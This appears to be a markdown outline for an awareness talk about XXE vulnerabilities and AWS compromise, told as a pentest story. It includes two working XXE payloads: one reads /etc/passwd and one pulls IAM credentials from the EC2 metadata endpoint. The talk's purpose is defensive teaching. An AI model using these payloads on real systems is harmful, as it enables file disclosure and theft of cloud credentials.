# XXE and AWS Compromise

## Outcomes
* People know about XXE
	* And maybe disable XML entity parsing
* People know about AWS Metadata endpoint

## Intro
* Ask who knows about
	* XML Entities
	* AWS Metadata endpoint

## Background
* There's an EC2 instance parsing XML
* It is getting pentested


* Pentester finds file upload
	* Notices lack of virus detection
	* _pentest finding screencap_ -- MEDI: No virus scanning

* Pentester notices XML files getting parsed
	* Tries to steal `/etc/passwd` with XXE
	* _pentest finding screencap_ -- HIGH: LFI with XXE

```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

* Pentester notices server is running in EC2
	* Uses XXE to get role --> `iam/info` 
	* Uses XXE to get creds --> `iam/security-credentials/<role-name>`
	* _pentest finding screencap_ -- CRIT: AWS Account compromise with XXE

```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/iam-role" >]><foo>&xxe;</foo>
```
<!-- TODO record demo -->
<!-- TODO pentest screencaps -->

## Summary
* If you're parsing XML ![stop it](https://media.giphy.com/media/l4Ki2obCyAQS5WhFe/giphy.gif)\
* Also limit access from your EC2 instances
	* Principle of least privilege

## Notes
* Most of the content from this [Netflix blog post](https://medium.com/netflix-techblog/netflix-information-security-preventing-credential-compromise-in-aws-41b112c15179)